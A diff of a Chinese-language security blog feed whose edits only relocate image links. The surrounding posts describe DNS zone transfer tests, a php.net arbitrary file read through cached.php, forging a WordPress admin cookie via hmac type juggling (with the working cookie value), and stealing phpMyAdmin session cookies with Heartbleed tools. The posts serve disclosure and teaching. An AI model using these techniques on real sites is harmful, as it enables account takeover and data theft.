-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-3fhvgOCVCFM/U2ncN_N5-pI/AAAAAAAAAV8/0_CLdKmKGqY/w1138-h337-no/3.svn_entries.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3fhvgOCVCFM/U2ncN_N5-pI/AAAAAAAAAV8/0_CLdKmKGqY/w1138-h337-no/3.svn_entries.png&quot; alt=&quot;.svn 目錄&quot; title=&quot;.svn 目錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn 目錄&quot; title=&quot;.svn 目錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;這時候三太子哪吒剛好路過，說他剛剛在 Pastebin 看到有人貼了&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;一篇跟這個網站好像有關聯的內容&lt;/a&gt;，講完他就開著水車跑去鎮壓龍宮了。點開那篇內容一看，內容有一些很奇怪的網址，讓人看了就很想點！隨便選了一個 http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php 打開來看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-Sc_wLFVIvxE/U2ncOtHzfvI/AAAAAAAAAWI/plfXjqZyIuo/w1138-h406-no/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Sc_wLFVIvxE/U2ncOtHzfvI/AAAAAAAAAWI/plfXjqZyIuo/w1138-h406-no/4.vote.tw.am_homepage.png&quot; alt=&quot;投票項目&quot; title=&quot;投票項目&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;投票項目&quot; title=&quot;投票項目&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;哇塞！原來從服貿就已經開始了呢！讓我們繼續點進去看看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-MYM6cr6quQA/U2ncOzrIF4I/AAAAAAAAAWg/hTfMXuiUtuQ/w1138-h455-no/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-MYM6cr6quQA/U2ncOzrIF4I/AAAAAAAAAWg/hTfMXuiUtuQ/w1138-h455-no/5.vote.tw.am_navigation.png&quot; alt=&quot;投票結果導覽頁面&quot; title=&quot;投票結果導覽頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;投票結果導覽頁面&quot; title=&quot;投票結果導覽頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;看起來是個後台，可以瀏覽使用者的投票記錄、留言等資料，那就點個投票記錄來看看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-ZsqRx5Ozaso/U2ncO0-8QtI/AAAAAAAAAWc/FpWLh6APufI/w1138-h882-no/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-ZsqRx5Ozaso/U2ncO0-8QtI/AAAAAAAAAWc/FpWLh6APufI/w1138-h882-no/6.vote.tw.am_vote_record.png&quot; alt=&quot;投票記錄&quot; title=&quot;投票記錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;投票記錄&quot; title=&quot;投票記錄&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;果然裡面存著眾多民眾的投票記錄，那麼用戶反饋應該就是留言了…&lt;/p&gt;
 
 &lt;p&gt;從這些內容看來，應該是有個集團擁有大量的民眾個資，並且一一發送訊息給這些人，背後目的尚不得而知。有可能是大陸人想利用這個熱潮確認這些電話號碼是否真實、可用，也有可能是不知名的黑手正在策劃下一個打壓動作？正當我們想搞清楚對方究竟是透過電話號碼還是信箱傳送 iMessage 時，哪吒忽然又路過了，丟了這張圖之後叫我們不要再瞎忙了趕快回家洗洗睡：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-UhhmGb1Smuc/U2nlje28okI/AAAAAAAAAXQ/XbRkf8djtqg/w951-h855-no/7.%25E8%25A9%2590%25E9%25A8%2599.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-UhhmGb1Smuc/U2nlje28okI/AAAAAAAAAXQ/XbRkf8djtqg/w951-h855-no/7.%25E8%25A9%2590%25E9%25A8%2599.png&quot; alt=&quot;IP、時間、電話、回應內容等資料&quot; title=&quot;IP、時間、電話、回應內容等資料&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IP、時間、電話、回應內容等資料&quot; title=&quot;IP、時間、電話、回應內容等資料&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;果然有電話！究竟這件事，是有網站大量洩漏個資，還是有人在民運期間利用這股熱潮蒐集個資，抑或是背後有什麼不可告人的秘密呢？讓我們繼續看下去～&lt;/p&gt;
 
@@ -6049,7 +6326,7 @@ zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/div&
 
 &lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-zKvUVHK73-c/U2do2IyDEpI/AAAAAAAAATk/9fpiMnq8pts/w844-h685-no/linux-zone-transfer-result.jpg&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-zKvUVHK73-c/U2do2IyDEpI/AAAAAAAAATk/9fpiMnq8pts/w844-h685-no/linux-zone-transfer-result.jpg&quot; alt=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;從上面的測試結果中我們可發現，zonetransfer.me 這個網域的所有 DNS 設定已全部被列出。&lt;/p&gt;
 
@@ -6084,7 +6361,7 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-AJaByKBuTUU/U2do2FfORdI/AAAAAAAAATc/LMY79aQtyFc/w626-h432-no/windows-zone-transfer-result.jpg&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-AJaByKBuTUU/U2do2FfORdI/AAAAAAAAATc/LMY79aQtyFc/w626-h432-no/windows-zone-transfer-result.jpg&quot; alt=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;測試結果與 Linux 環境所得到的資料雷同，可成功列出該網域的所有 DNS 設定。&lt;/p&gt;
 
@@ -6155,11 +6432,11 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;在 Windows server 當中，我們可到伺服器管理員修改網域的相關設定，如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-r7_az_iPK5c/U2do2LxMAQI/AAAAAAAAAT0/novlW-stA3s/w844-h678-no/windows-zone-transfer-solution-1.png&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-r7_az_iPK5c/U2do2LxMAQI/AAAAAAAAAT0/novlW-stA3s/w844-h678-no/windows-zone-transfer-solution-1.png&quot; alt=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;在伺服器管理員中，選定想要修改的網域（此處以 test.com 為例），按右鍵點選內容，將會跳出選單如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-6GroJXkIY6I/U2do2i3GqrI/AAAAAAAAATo/QzfAWqsvhUw/w401-h427-no/windows-zone-transfer-solution-2.png&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-6GroJXkIY6I/U2do2i3GqrI/AAAAAAAAATo/QzfAWqsvhUw/w401-h427-no/windows-zone-transfer-solution-2.png&quot; alt=&quot;修改 test.com 的 zone transfer 設定&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;修改 test.com 的 zone transfer 設定&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;接著就是觀看「允許區域轉送」選項是否有勾選，若已勾選，則確認轉送對象是否為下列兩種：&lt;/p&gt;
 
@@ -6191,26 +6468,26 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;!-- more --&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ECwrgluiQyQ/U0PMyB-vJEI/AAAAAAAAAPo/D5K9nPbpiKg/s2560/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ECwrgluiQyQ/U0PMyB-vJEI/AAAAAAAAAPo/D5K9nPbpiKg/w822-h645-no/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day 漏洞交易網站&quot; title=&quot;1337day 漏洞交易網站&quot; /&gt;&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day 漏洞交易網站&quot; title=&quot;1337day 漏洞交易網站&quot; /&gt;&lt;br /&gt;
 &lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;可以看到這個弱點是不公開的，想要知道內容的話要支付 82 美元相當於新台幣 3500 元呢！在強烈的好奇心屈使之下，自己打開工具來找看看：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-3RsKEJngblM/U0PMyFTMzGI/AAAAAAAAAPw/v9zN3MBAs7U/s2560/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3RsKEJngblM/U0PMyFTMzGI/AAAAAAAAAPw/v9zN3MBAs7U/w926-h678-no/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP 官方網站原始碼&quot; title=&quot;PHP 官方網站原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP 官方網站原始碼&quot; title=&quot;PHP 官方網站原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;透過簡單的分析和一點點運氣，找到了 「&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;」 這隻程式，發現它傳入了「t」和「f」這兩個參數。「t」直覺上就是個 rand 數值，而「f」應該就是檔案位置了。這時候對 f 參數小小修改一下，神奇的事情發生了：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-9x_SEH82fsw/U0PMyelwW3I/AAAAAAAAAPs/yJWXMg_UQiU/s2560/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-9x_SEH82fsw/U0PMyelwW3I/AAAAAAAAAPs/yJWXMg_UQiU/w928-h678-no/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php 讀取原始碼&quot; title=&quot;cached.php 讀取原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php 讀取原始碼&quot; title=&quot;cached.php 讀取原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;index.php 的原始碼被完整的讀出來，當然也要來看一下 cached.php 是怎麼寫的：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-eOvfw-K2CHg/U0PMy_oHw6I/AAAAAAAAAQA/EXK1c8AFd-k/s2560/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-eOvfw-K2CHg/U0PMy_oHw6I/AAAAAAAAAQA/EXK1c8AFd-k/w861-h678-no/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php 檢視原始碼&quot; title=&quot;cached.php 檢視原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php 檢視原始碼&quot; title=&quot;cached.php 檢視原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;可以看到此處並未對 $_GET[“f”] 進行檢查，所以修改了 $_GET[“f”] 後，與 $abs 組合完，最後就直接丟入 readfile 讀取檔案。比較值得研究的是這邊使用了 realpath 與 strncmp 來比較 f 及 DOCUMENT_ROOT，確保 $abs 只能在網站目錄之下，所以無法使用 ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) 的方式跳脫目錄進行更進一步的滲透。&lt;/p&gt;
 
 &lt;p&gt;最後我們將此發現回報給 security@php.net ，得到的回應是他們是「故意的 (intentional)」。且後來也知道 PHP 官網是開放原始碼（Open Source）的，可以到 &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; 下載整個官網的原始碼。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-6dFKFRG7_Y4/U0PMzE-jk2I/AAAAAAAAAP8/lbpvS0Z2TpA/s2560/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-6dFKFRG7_Y4/U0PMzE-jk2I/AAAAAAAAAP8/lbpvS0Z2TpA/w731-h332-no/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET 官網團隊回應&quot; title=&quot;PHP.NET 官網團隊回應&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET 官網團隊回應&quot; title=&quot;PHP.NET 官網團隊回應&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;雖然在這個案例中並沒有造成實質上的危害，沒有帳號、密碼、系統設定等機敏資料，但若把此種寫法用在其他地方，則可能造成很大的資安風險。就連 PHP 官方網站都有這樣的失誤，身為開發人員的你們更不可不慎！&lt;/p&gt;
 </content>
@@ -6303,11 +6580,11 @@ hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;&lt;br /&gt;
 
 &lt;p&gt;經過一段長時間的等待，得到的結果如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。&lt;/p&gt;
@@ -6358,20 +6635,20 @@ hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;&lt;br /&gt;
 
 &lt;p&gt;首先利用 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; 來測試，來看伺服器是否有被 heartbleed 漏洞影響，fbi.gov 在第三天已經修復這個問題。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-EeW6B_aOR7s/U0kWbYnPIPI/AAAAAAAAAQ8/o-WQ5rGGpOs/s2560/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-EeW6B_aOR7s/U0kWbYnPIPI/AAAAAAAAAQ8/o-WQ5rGGpOs/w896-h678-no/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; title=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; title=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;如果是檢測一個有漏洞的網站，這個工具會直接把記憶體的內容顯示出來，其中可能包括 http 傳輸的資料、帳號密碼、私密金鑰等。在這個例子中，攻擊程式讀取到使用者送出的 form，若其中包含個資將會被一覽無遺，非常危險。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-csGMcT5ue6k/U0kWbdd0BTI/AAAAAAAAARI/_eJXbANavDw/s2560/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-csGMcT5ue6k/U0kWbdd0BTI/AAAAAAAAARI/_eJXbANavDw/w896-h678-no/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; title=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; /&gt;&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; title=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; /&gt;&lt;br /&gt;
 &lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;另一個工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; 可以使用 -R 參數做更有效的利用。直接執行指令可以快速顯示伺服器有無問題。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-899EwdZRGgc/U0kWbbuSqLI/AAAAAAAAARE/1MUSueVzmV8/s2560/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-899EwdZRGgc/U0kWbbuSqLI/AAAAAAAAARE/1MUSueVzmV8/w896-h678-no/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; title=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; title=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;如果使用「-R」參數並且指定特定的正規表示式，可以抓出想要獲取的資料。例如 Cookie、帳號密碼等。以此例，我們知道這個網站提供 &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; 套件，因此直接鎖定「pmaPass」資料來抓取，沒想到第一次就抓到了。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-r_BgZxi8iAY/U0kWcfBjHtI/AAAAAAAAARM/UJ2o6sOlgx8/s2560/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-r_BgZxi8iAY/U0kWcfBjHtI/AAAAAAAAARM/UJ2o6sOlgx8/w896-h678-no/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; title=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; title=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;接著攻擊者只要把這個獲取到的 Cookie 存入自己的瀏覽器中，就可以如影片中盜用這個帳號。是否很危險呢？&lt;/p&gt;
 
@@ -6479,11 +6756,11 @@ hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;&lt;br /&gt;
 
 &lt;p&gt;根據 &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; 的&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;研究報告&lt;/a&gt;指出，他們針對 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 前一百萬個網站&lt;/a&gt;進行檢測，大約有 36% 的伺服器支援 TLS、7.6% 的伺服器含有此漏洞。ZMap 並提供了一個&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;完整的清單&lt;/a&gt;列出在 2014/4/11 17:00 尚未修復漏洞的網站。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-5iuzr3g9s3U/U0lID8GrS4I/AAAAAAAAARw/Mi673wz-Jhc/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-5iuzr3g9s3U/U0lID8GrS4I/AAAAAAAAARw/Mi673wz-Jhc/w979-h586-no/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;有什麼值得測試的網站呢&quot;&gt;有什麼值得測試的網站呢？&lt;/h3&gt;
 
